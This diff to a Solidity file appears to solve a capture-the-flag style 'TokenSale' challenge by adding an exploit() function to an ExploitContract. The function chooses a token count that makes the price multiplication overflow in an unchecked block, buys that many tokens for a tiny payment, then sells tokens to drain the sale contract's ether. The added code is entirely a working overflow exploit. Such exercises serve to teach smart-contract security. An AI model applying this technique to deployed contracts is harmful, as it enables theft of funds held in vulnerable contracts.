@@ -36,11 +36,22 @@ contract TokenSale {
 // Write your exploit contract below
 contract ExploitContract {
     TokenSale public tokenSale;
-
+    uint256 constant PRICE_PER_TOKEN = 1 ether;
+    event Buy(uint256 numTokens, uint256 amount);
     constructor(TokenSale _tokenSale) {
         tokenSale = _tokenSale;
     }
 
     receive() external payable {}
     // write your exploit functions below
+    function exploit() public {
+        uint256 numTokens = type(uint256).max / PRICE_PER_TOKEN + 1;
+        uint256 amount;
+        unchecked {
+            amount = numTokens * PRICE_PER_TOKEN;
+        }
+        emit Buy(numTokens, amount);
+        tokenSale.buy{value: amount}(numTokens);
+        tokenSale.sell(address(tokenSale).balance / PRICE_PER_TOKEN);
+    }
 }
